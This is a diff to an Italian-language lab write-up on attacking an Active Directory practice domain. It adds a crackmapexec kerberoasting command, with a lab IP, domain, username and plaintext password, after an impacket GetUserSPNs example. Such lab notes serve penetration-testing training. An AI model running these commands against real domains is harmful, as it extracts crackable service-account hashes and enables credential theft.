@@ -66,3 +66,8 @@ impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/bra
 ```
 ![[Pasted image 20230825112141.png]]
 Gli hash di questi due utenti sono stati inseriti nel file kerberoasting.hashes (opzione -outpoutfile)
+
+Puoi usare anche crackmapexec per farlo
+```bash
+cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
+```
